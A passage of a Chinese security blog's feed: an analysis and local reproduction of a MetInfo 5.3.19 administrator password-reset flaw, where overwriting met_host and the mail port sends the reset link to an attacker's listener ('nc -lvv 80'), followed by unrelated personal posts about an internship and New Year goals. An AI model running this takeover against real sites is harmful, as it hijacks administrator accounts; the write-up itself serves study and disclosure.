src=&apos;http://www.metinfo.cn/upload/200911/1259148297.gif&apos; /&gt;&lt;/a&gt;&lt;/div&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$body .=&quot;&lt;div class=&apos;text&apos;&gt;&lt;p&gt;&quot;.$lang_hello.$admin_name.&quot;&lt;/p&gt;&lt;p&gt;$lang_getTip1&lt;/p&gt;&quot;;</span><br><span class="line">$body .=&quot;&lt;p&gt;&lt;a href=&apos;$mailurl&apos;&gt;$mailurl&lt;/a&gt;&lt;/p&gt;\n&quot;;</span><br><span class="line">if($met_agents_type&lt;=1)&#123;</span><br><span class="line">$body .=&quot;&lt;p&gt;$lang_getTip2&lt;/p&gt;&lt;/div&gt;&lt;div class=&apos;copy&apos;&gt;$foot&lt;/a&gt;&lt;/div&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">require_once ROOTPATH.&apos;include/jmail.php&apos;;</span><br><span class="line">$sendMail=jmailsend($from,$fromname,$to,$title,$body,$usename,$usepassword,$smtp);</span><br><span class="line">if($sendMail==0)&#123;</span><br><span class="line">require_once ROOTPATH.&apos;include/export.func.php&apos;;</span><br><span class="line">$post=array(&apos;to&apos;=&gt;$to,&apos;title&apos;=&gt;$title,&apos;body&apos;=&gt;$body);</span><br><span class="line">$met_file=&apos;/passwordmail.php&apos;;</span><br><span class="line">$sendMail=curl_post($post,30);</span><br><span class="line">if($sendMail==&apos;nohost&apos;)$sendMail=0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$text=$sendMail?$lang_getTip3.$lang_memberEmail.&apos;：&apos;.$admin_list[&apos;admin_email&apos;]:$lang_getTip4;</span><br><span class="line">okinfo(&apos;../index.php&apos;,$text);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>注意这里的发送，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">require_once ROOTPATH.&apos;include/jmail.php&apos;;</span><br><span class="line">$sendMail=jmailsend($from,$fromname,$to,$title,$body,$usename,$usepassword,$smtp);</span><br><span class="line">if($sendMail==0)&#123;</span><br><span class="line">require_once ROOTPATH.&apos;include/export.func.php&apos;;</span><br><span class="line">$post=array(&apos;to&apos;=&gt;$to,&apos;title&apos;=&gt;$title,&apos;body&apos;=&gt;$body);</span><br><span class="line">$met_file=&apos;/passwordmail.php&apos;;</span><br><span class="line">$sendMail=curl_post($post,30);</span><br><span class="line">if($sendMail==&apos;nohost&apos;)$sendMail=0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当<code>$sendMail==0</code>时，信息会通过变量<code>$post</code>调用<code>curl_post</code>发送出去。<code>curl_post</code>定义在<code>include/export.func.php</code>中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">function curl_post($post,$timeout)&#123;</span><br><span class="line">global $met_weburl,$met_host,$met_file;</span><br><span class="line">$host=$met_host;</span><br><span class="line">$file=$met_file;</span><br><span class="line">if(get_extension_funcs(&apos;curl&apos;)&amp;&amp;function_exists(&apos;curl_init&apos;)&amp;&amp;function_exists(&apos;curl_setopt&apos;)&amp;&amp;function_exists(&apos;curl_exec&apos;)&amp;&amp;function_exists(&apos;curl_close&apos;))&#123;</span><br><span class="line">$curlHandle=curl_init(); </span><br><span class="line">curl_setopt($curlHandle,CURLOPT_URL,&apos;http://&apos;.$host.$file); </span><br><span class="line">curl_setopt($curlHandle,CURLOPT_REFERER,$met_weburl);</span><br><span class="line">curl_setopt($curlHandle,CURLOPT_RETURNTRANSFER,1); </span><br><span class="line">curl_setopt($curlHandle,CURLOPT_CONNECTTIMEOUT,$timeout);</span><br><span class="line">curl_setopt($curlHandle,CURLOPT_TIMEOUT,$timeout);</span><br><span class="line">curl_setopt($curlHandle,CURLOPT_POST, 1);</span><br><span class="line">curl_setopt($curlHandle,CURLOPT_POSTFIELDS, $post);</span><br><span class="line">$result=curl_exec($curlHandle); </span><br><span class="line">curl_close($curlHandle); </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">if(function_exists(&apos;fsockopen&apos;)||function_exists(&apos;pfsockopen&apos;))&#123;</span><br><span class="line">$post_data=$post;</span><br><span class="line">$post=&apos;&apos;;</span><br><span class="line">@ini_set(&quot;default_socket_timeout&quot;,$timeout);</span><br><span class="line">while (list($k,$v) = each($post_data)) &#123;</span><br><span class="line">$post .= rawurlencode($k).&quot;=&quot;.rawurlencode($v).&quot;&amp;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$post = substr( $post , 0 , -1 );</span><br><span class="line">$len = strlen($post);</span><br><span class="line">if(function_exists(fsockopen))&#123;</span><br><span class="line">$fp = @fsockopen($host,80,$errno,$errstr,$timeout);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$fp = @pfsockopen($host,80,$errno,$errstr,$timeout);</span><br><span class="line">&#125;</span><br><span class="line">if (!$fp) &#123;</span><br><span class="line">$result=&apos;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">$result = &apos;&apos;;</span><br><span class="line">$out = &quot;POST $file HTTP/1.0\r\n&quot;;</span><br><span class="line">$out .= &quot;Host: $host\r\n&quot;;</span><br><span class="line">$out .= &quot;Referer: $met_weburl\r\n&quot;;</span><br><span class="line">$out .= &quot;Content-type: application/x-www-form-urlencoded\r\n&quot;;</span><br><span class="line">$out .= &quot;Connection: Close\r\n&quot;;</span><br><span class="line">$out .= &quot;Content-Length: $len\r\n&quot;;</span><br><span class="line">$out .=&quot;\r\n&quot;;</span><br><span class="line">$out .= $post.&quot;\r\n&quot;;</span><br><span class="line">fwrite($fp, $out);</span><br><span class="line">$inheader = 1; </span><br><span class="line">while(!feof($fp))&#123;</span><br><span class="line">$line = fgets($fp,1024); </span><br><span class="line">if ($inheader == 0) &#123;    </span><br><span class="line">$result.=$line;</span><br><span class="line">&#125;  </span><br><span class="line">if ($inheader &amp;&amp; ($line == &quot;\n&quot; || $line == &quot;\r\n&quot;)) &#123;  </span><br><span class="line">$inheader = 0;  </span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">while(!feof($fp))&#123;</span><br><span class="line">$result.=fgets($fp,1024);</span><br><span class="line">&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line">str_replace($out,&apos;&apos;,$result);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$result=&apos;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$result=trim($result);</span><br><span class="line">if(substr($result,0,7)==&apos;metinfo&apos;)&#123;</span><br><span class="line">return substr($result,7);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">return &apos;nohost&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以发现<code>$met_host</code>表示右键内容发送地点，并且这个参数可以通过变量覆盖进行控制，那么如何让<code>$sendMail==0</code>，触发发送邮件程序呢？这里包含了<code>jmail.php</code>，打开<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">global $met_fd_port,$met_fd_way;</span><br><span class="line">$mail             = new PHPMailer();</span><br><span class="line">//$mail-&gt;SMTPDebug  = 3;</span><br><span class="line"></span><br><span class="line">$mail-&gt;CharSet    = &quot;UTF-8&quot;; // charset</span><br><span class="line">$mail-&gt;Encoding   = &quot;base64&quot;;</span><br><span class="line">$mail-&gt;Timeout    = 15; </span><br><span class="line">$mail-&gt;IsSMTP(); // telling the class to use SMTP</span><br><span class="line"></span><br><span class="line">//system</span><br><span class="line">if(stripos($smtp,&apos;.gmail.com&apos;)===false)&#123;</span><br><span class="line">$mail-&gt;Port       = $met_fd_port;</span><br><span class="line">$mail-&gt;Host       = $smtp; // SMTP server</span><br><span class="line">if($met_fd_way==&apos;ssl&apos;)&#123;</span><br><span class="line">$mail-&gt;SMTPSecure = &quot;ssl&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$mail-&gt;SMTPSecure = &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里<code>met_fd_port</code>指定了邮件的发送端口，属于系统配置。因此倘若我们利用前面的变量覆盖漏洞修改端口，即可导致邮件发送失败，进入到<code>curl_post</code>。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先搭建测试环境，本来想在vps上搭建lamp环境然后上传站点的，但是考虑到安全问题，以及各种依赖的升级等等就搁置了。直接在本地Windows部署，然后通过Kali虚拟机和vps测试一下。<br>首先在本地搭建phpstudy环境。Windows搭建phpstudy还是比肩方便的下载下来PHPstudy，解压，几乎是一键式安装啊，安装过后直接启动就好了。<br><img src="http://rookiehacker.org:8888/images/2019/02/23/ba31ddb159c27a7a41115f15e15bd06e.png" alt="phpstudy启动"><br>然后是MetInfo5.3.19部署。这里直接从米拓官网下载历史版本源码即可，下载下来是个zip压缩包，这里讲压缩版保存在安装phpstudy是创建的www路径下，比如<code>E:\phpstudy\PHPTutorial\WWW\</code>，直接解压即可。然后在浏览器输入<code>http://127.0.0.1:port</code>这里port为你设置的Apache运行端口，这里可在phpstudy运行管理的端口设置那里进行自主配置。然后浏览器就会出现安装的一系列步骤，按提示来即可。ps.要是想删除重新安装，记得删除/config文件夹下的install.lock</p><h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><p>首先在vps上监听80端口<code>nc -lvv 80</code>，应为curl_post使用http协议，默认工作在80端口。</p><p>这里直接在kali虚拟机上用burpsuite一把梭就好了。构造找回密码请求如下：<br><img src="http://rookiehacker.org:8888/images/2019/02/23/12f57f47db95a1e2ca96ebb34ce91ce7.png" alt="找回密码"><br>利用burpsuite构造如下请求，<code>met_host</code>处为用于接收重置链接的vps地址：<br><img src="http://rookiehacker.org:8888/images/2019/02/23/08bac3184093bb0ddd0bc7952a9619e1.png" alt="构造请求"><br>请求发送后，会在vps上收到如下数据信息：<br><img src="http://rookiehacker.org:8888/images/2019/02/23/99a31fb1b8fc539a1c40df6e26ea44ce.jpg" alt="收到数据"><br>注意，这里的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105:2333/admin/admin/getpassword.php?p=09f7Rd6YXI0qJlu2HY2qe23Prf5j8UAn4Vo8CEXXX9GqAfbj%2BkJGFJUhHeSlkwTBUjtPci0XQX23qgm8pYNupqQsRw</span><br></pre></td></tr></table></figure></p><p>就是密码重置链接，到这里我们就差不多已经成功了。然后就可以登录链接，设置密码，登录后台，<br><img src="http://rookiehacker.org:8888/images/2019/02/23/9b39a2833cdc6309a8336f49476cc61d.png" alt=""><br><img src="http://rookiehacker.org:8888/images/2019/02/23/aa5bc3af3f8d10ed3eeaae55f6d1d5f2.png" alt="密码重置"><br><img src="http://rookiehacker.org:8888/images/2019/02/23/8dad18ed426d4a975a68943cbc432001.png" alt="登录后台"><br>测试结束。</p><h2 id="措施"><a href="#措施" class="headerlink" title="措施"></a>措施</h2><p>官方已经放出最新版本，请及时升级。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>码代码是要时刻注意变量覆盖危险，做好代码审计和测试工作。</p><hr><blockquote><p><em>声明：</em><br>文章标题：<a href="http://blog.rookiehacker.org/2019/02/22/metinfotest/" title="【Web渗透】Metinfo 5.3.19 管理员密码重置漏洞分析">【Web渗透】Metinfo 5.3.19 管理员密码重置漏洞分析</a><br>文章作者：<a href="http://blog.rookiehacker.org/about/">RookieHacker</a><br>文章链接：<a href="http://blog.rookiehacker.org/2019/02/22/metinfotest/" title="【Web渗透】Metinfo 5.3.19 管理员密码重置漏洞分析">http://blog.rookiehacker.org/2019/02/22/metinfotest/</a><br>文章版权属本博主所有，有问题或者建议欢迎在下方评论。欢迎转载、引用，但请标明作者和原文地址，谢谢。</p></blockquote><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      Metinfo5.3.19管理员密码重置漏洞的分析与复现
    
    </summary>
    
      <category term="Web渗透" scheme="http://blog.rookiehacker.org/categories/Web%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透" scheme="http://blog.rookiehacker.org/tags/%E6%B8%97%E9%80%8F/"/>
    
      <category term="密码重置" scheme="http://blog.rookiehacker.org/tags/%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"/>
    
      <category term="Metinfo" scheme="http://blog.rookiehacker.org/tags/Metinfo/"/>
    
  </entry>
  
  <entry>
    <title>【长亭时光】这些天我学到的东西</title>
    <link href="http://blog.rookiehacker.org/2019/02/21/thedaysinchaitin/"/>
    <id>http://blog.rookiehacker.org/2019/02/21/thedaysinchaitin/</id>
    <published>2019-02-21T12:28:55.000Z</published>
    <updated>2019-02-22T12:08:36.165Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=20744788&auto=0&height=66"></iframe><h1 id="关于工作"><a href="#关于工作" class="headerlink" title="关于工作"></a>关于工作</h1><h2 id="长亭"><a href="#长亭" class="headerlink" title="长亭"></a>长亭</h2><p><img src="http://rookiehacker.org:8888/images/2019/02/21/9790f484129544d14e09d1e2bb34e988.png" alt="我司Chaitin"><br>应该算是十分幸运吧，来到了大佬云集的<a href="https://www.chaitin.cn/" target="_blank" rel="noopener">长亭科技</a>，以后见了别人也可以吹吹牛逼啦O(∩_∩)O哈哈~，长亭的氛围真的好得不得了啊，到处都是大佬，工位对角就是朱文雷，楼下是我们的“车联网专家”杨坤博士，还有到处救火的“萌神”刘超，醒哥，扬神……突然感觉我好像连递茶的资格可能都不够哦。。在这样的氛围中，我真是不想成长都难啊。。并且长亭的福利也是超级棒，人手MacBook的标配（只不过实习生是Air，性能略辣鸡），免费工作餐让我吃得很“难瘦”，还有双休、房补······<br>哈哈，言归正传，简单介绍一下长亭吧，现在公司分成了几大部分：产品研发中心、销售服务中心、安全服务中心、市场营销中心、技术支持中心等。楼下大多是多年赛棍出身的白帽子大佬，楼上是负责开发的技术狂魔，我呢，在研发部搬砖，负责谛听产品的相关开发工作。大概就是这样子吧。<br><img src="http://rookiehacker.org:8888/images/2019/02/21/b7f82a70b62f5024eda10c9da957d6b5.png" alt="工作餐"><br><img src="http://rookiehacker.org:8888/images/2019/02/21/f831b47cde275d6c506faf4088921126.jpg" alt="我的工位"><br><img src="http://rookiehacker.org:8888/images/2019/02/21/939c724ddd7dbb6be46886f525df7554.jpg" alt="我的工牌"></p><h2 id="我的工作"><a href="#我的工作" class="headerlink" title="我的工作"></a>我的工作</h2><p>上面已经说了，我的工作主要是负责谛听的产品开发。谛听（D-Sensor）是一款内网威胁感知系统，利用欺骗伪装技术，通过布置陷阱、诱敌深入、记录路径、溯源取证，解决内网防护难以察觉、难以明确、难以追溯三大问题，赋予内网全新的主动对抗能力（抄自我司<a href="https://www.chaitin.cn/zh/dsensor" target="_blank" rel="noopener">官网</a>）。<br>不过主要的技术开发工作已经完成了，产品也已经上线一段时间了，我的工作就是根据用户的需求，对产品就行相应的升级开发，负责后端的开发工作，加入一些新的功能，来适应用户需求。开发的主要工具就是VS Code、docker、git，语言Python、Go（现在还未涉及，估计就要学一下Go了），来了之后用了两三天折腾环境，最后总算是跑起来了。。多亏大佬不嫌弃，教我这，教我那，可能这短短的一周学到的东西比我浪一年学得都多。。</p><h1 id="学到的东西"><a href="#学到的东西" class="headerlink" title="学到的东西"></a>学到的东西</h1><h2 id="Python-Django"><a href="#Python-Django" class="headerlink" title="Python + Django"></a>Python + Django</h2><p>年前就在看Django了，感觉Django真的很强大（其实感觉flask也不错），跟着网上的教程写了个个人博客，写完之后真让我有种立马上线自己用的冲动啊！！页面是我喜欢的精简风格，后台、平台、标签云、订阅等等几乎该涉及到的都涉及了，这里留下<a href="https://www.zmrenwu.com/post/2" target="_blank" rel="noopener">传送门</a>。<br>现在的工作也让自己对Django的框架进一步熟悉了（我好像泄露了什么。。。）</p><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>docker-compose的使用（有时间学习一下写法），<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down      // 关闭容器</span><br><span class="line">docker-compose up -d     // 运行容器</span><br></pre></td></tr></table></figure></p><p>一定要记住在运行后，当不用时要及时在指定docker-compose.yml文件路径关闭容器，不然再其他地方使用docker-compose时可能会发生冲突。</p><p>关于docker，一直以为在python中pip install docker 就可以了，可见我是有多天真。。。<br>首先安装docker，running状态走起，然后就可以轻松愉快的部署开发项目了，真的是简单啊，这里熟悉了docker的一些基本的用法，<a href="http://www.runoob.com/docker/docker-tutorial.html" target="_blank" rel="noopener">docker教程</a>，有空补上！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker stop </span><br><span class="line">docker start</span><br><span class="line">docker ps</span><br><span class="line">docker exec -it imgname bash</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>还有一些前端的工具，像npm、yarn等等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yarn build</span><br><span class="line">TARGET=http://loaclhost:1234 TYPE=D yarn start   //  启动前端服务器</span><br></pre></td></tr></table></figure></p><h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><p>关于git，还是有了解的，因为之前写博客啦，提交GitHub上面的项目什么的了，都要用到git，但是我的记性真的好差（怕不是老了？？？），准备考研这大半年没怎么动手了，操作也忘得差不多了。。来了让大佬手把手教，真的好尴尬￣□￣｜｜<br>这里不多说了，推荐一下<a href="ttps://www.liaoxuefeng.com" target="_blank" rel="noopener">廖雪峰的Git教程</a></p><h1 id="关于考研"><a href="#关于考研" class="headerlink" title="关于考研"></a>关于考研</h1><h2 id="成绩-准备复试"><a href="#成绩-准备复试" class="headerlink" title="成绩 + 准备复试"></a>成绩 + 准备复试</h2><p>晒一下成绩先。<br><img src="http://rookiehacker.org:8888/images/2019/02/21/9dba8b3a7fec2564d6c328873e5217a4.png" alt="我的成绩"><br>分数是不少了，可是今年分数真的爆炸，367排名238,350就排名到400了，今年软微收270还是好几个专业一起分名额，我在计算机技术专业课867里面排名115-120，如果能像去年那样分配一般的名额的话，那还有机会的，进复试应该没什么问题，所以接下来得好好准备了，这可是今年最大的愿望了，一定要实现！一定能实现！<br>不说了，好要上班，准备复试的时间太宝贵了，所以写完这篇就准备暂时封笔，等到复试结束吧！滚去看书了~</p><hr><blockquote><p><em>声明：</em><br>文章标题：<a href="http://blog.rookiehacker.org/2019/02/21/thedaysinchaitin/" title="【长亭时光】这些天我学到的东西">【长亭时光】这些天我学到的东西</a><br>文章作者：<a href="http://blog.rookiehacker.org/about/">RookieHacker</a><br>文章链接：<a href="http://blog.rookiehacker.org/2019/02/21/thedaysinchaitin/" title="【长亭时光】这些天我学到的东西">http://blog.rookiehacker.org/2019/02/21/thedaysinchaitin/</a><br>文章版权属本博主所有，有问题或者建议欢迎在下方评论。欢迎转载、引用，但请标明作者和原文地址，谢谢。</p></blockquote><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      来了一快两周了，总结一下收获吧~
    
    </summary>
    
      <category term="Python" scheme="http://blog.rookiehacker.org/categories/Python/"/>
    
    
      <category term="Python" scheme="http://blog.rookiehacker.org/tags/Python/"/>
    
      <category term="Django" scheme="http://blog.rookiehacker.org/tags/Django/"/>
    
      <category term="Docker" scheme="http://blog.rookiehacker.org/tags/Docker/"/>
    
      <category term="Git" scheme="http://blog.rookiehacker.org/tags/Git/"/>
    
      <category term="长亭" scheme="http://blog.rookiehacker.org/tags/%E9%95%BF%E4%BA%AD/"/>
    
  </entry>
  
  <entry>
    <title>新年快乐！</title>
    <link href="http://blog.rookiehacker.org/2019/02/05/happynewyear-1/"/>
    <id>http://blog.rookiehacker.org/2019/02/05/happynewyear-1/</id>
    <published>2019-02-05T11:51:42.000Z</published>
    <updated>2019-02-05T12:51:09.224Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="新年快乐！"><a href="#新年快乐！" class="headerlink" title="新年快乐！"></a>新年快乐！</h2><p>又是一年春来到！盼望着，盼望着，终于迎来了本命年~回收2018，其实脑海中并没有太多记忆犹新的片段，总结一下2018，也就是考研失利-毕业季-考研二战罢了。午夜的钟声还未响起，窗外便早已成了烟花鞭炮的海洋，我也起身放了鞭炮，爬上房顶，去欣赏那绚烂多姿的烟火。可能这花火便是对2018最好的告慰吧~男人，从哪跌倒就要从哪里爬起来！不经历失败，何谓成功！2018匆匆走过，2019呼啸而至，不忘初心，砥砺前行！</p><h2 id="Flag-Time"><a href="#Flag-Time" class="headerlink" title="Flag Time"></a>Flag Time</h2><p>又到了立flag的时间~</p><h3 id="第一条"><a href="#第一条" class="headerlink" title="第一条"></a>第一条</h3><p>猪年，作为一只小猪，最希望的还是要把考研给顺利通过啊，这应该也是本年度最最最重要的了。</p><h3 id="第二条"><a href="#第二条" class="headerlink" title="第二条"></a>第二条</h3><p>要好好珍惜在长亭实习的宝贵机会，提升自己的专业技能，也顺便攒攒银子，争取能在暑假的时候和女神、好兄弟（当然最好是只有我女神啦）一起去旅游啊，然后不知道能不能有可能整一台MBP啊。。。</p><h3 id="第三条"><a href="#第三条" class="headerlink" title="第三条"></a>第三条</h3><p>今天（2019.2.5）体重78kg，争取到实习结束的时候（6个月后左右，也就是2019.8.1）体重能维持在65-70kg之间吧，主要就是减脂，肌肉也要涨上去，要有腹肌！（正好找的房子应该就在奥体公园附近，以后可以跑起来啦！）</p><h3 id="第四条"><a href="#第四条" class="headerlink" title="第四条"></a>第四条</h3><p>我知道我女神的要求挺高的，自己的条件。。。额。。其实好像没什么条件吧。。不过，没有条件，那就创造条件啊，但是不能过头，也不能太死缠烂打那种（我也不是那种人吧），我还是相信缘分，缘分到了，该来的总不会迟到，要耐得住寂寞！加油哦！</p><h3 id="第五条"><a href="#第五条" class="headerlink" title="第五条"></a>第五条</h3><p>我再想想，后续补上吧~</p><h2 id="最近忙了些什么"><a href="#最近忙了些什么" class="headerlink" title="最近忙了些什么"></a>最近忙了些什么</h2><p>其实最近挺无聊的，每天都挺没劲的，天天就找房子，和兄弟浪，同学聚会，王者吃鸡，书看了几页吧，倒是还不如这两天效率高，花了几分钟搞好了心心念的图床（不过以前的图可能是真的丢了。。。），用的<a href="https://github.com/Chevereto/Chevereto-Free" target="_blank" rel="noopener">cheverto</a>，不过还是想自己造轮子~希望最近能够搞出来个demo吧。</p><p>其实时间过得真快啊，出去中间去北京的三天时间，自己在家已经差不多一个半月了，再过几天，就要去北京开启实习生活了，一定要好好安排实习的时间，虽然成绩还得几天才能公布，但内心隐隐感觉应该是稳了，一定要把复试搞好，打个漂亮的翻身仗！<br>2019，小猪加油ヾ(◍°∇°◍)ﾉﾞ</p><p>试试自己搭的图床的效果~<br><img src="http://rookiehacker.org:8888/images/2019/02/04/39a371a51bb10d56ef685755ab2e7984.png" alt="2019，加油！"></p><hr><blockquote><p>*声明：<br>文章标题：<a href="http://blog.rookiehacker.org/2019/02/05/happynewyear-1/" title="新年快乐！">新年快乐！</a><br>文章作者：<a href="http://blog.rookiehacker.org/about/">RookieHacker</a><br>文章链接：<a href="http://blog.rookiehacker.org/2019/02/05/happynewyear-1/" title="新年快乐！">http://blog.rookiehacker.org/2019/02/05/happynewyear-1/</a><br>文章版权属本博主所有，有问题或者建议欢迎在下方评论。欢迎转载、引用，但请标明作者和原文地址，谢谢。</p></blockquote><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      岁岁年年，年年岁岁，一年又一年，请继续前进的脚步！
    
    </summary>
    
      <category term="生活" scheme="http://blog.rookiehacker.org/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="http://blog.rookiehacker.org/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>【北京之行】圆满完成任务！拿到实习offer！</title>
    <link href="http://blog.rookiehacker.org/2019/01/10/getoffer/"/>
    <id>http://blog.rookiehacker.org/2019/01/10/getoffer/</id>
    <published>2019-01-10T15:22:42.000Z</published>
    <updated>2019-01-10T16:19:58.326Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前路漫漫，努力向前"><a href="#前路漫漫，努力向前" class="headerlink" 